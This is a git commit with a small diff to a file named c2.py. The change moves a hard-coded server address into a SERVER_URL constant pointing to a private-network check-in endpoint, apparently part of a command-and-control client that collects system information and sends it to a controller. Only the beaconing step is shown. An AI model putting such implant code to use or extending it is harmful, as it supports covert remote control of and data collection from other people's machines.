07fbd5ce1ce7673a37df2b2c2303af50674bbd09
d-tang9 <dtang9@live.com>
2024-10-01 16:11:47 -0400

    123

--- c2.py
+++ c2.py
@@ -1,8 +1,10 @@
 from functions.c2_functions import get_sysinfo, first_checkin
 
+SERVER_URL = "http://192.168.2.10:5000/checkin"
+
 def c2():
     sysinfo = get_sysinfo()
-    first_response = first_checkin("192.168.2.10", sysinfo)
+    first_response = first_checkin(SERVER_URL, sysinfo)
 
     if not first_response:
         print("Failed?")
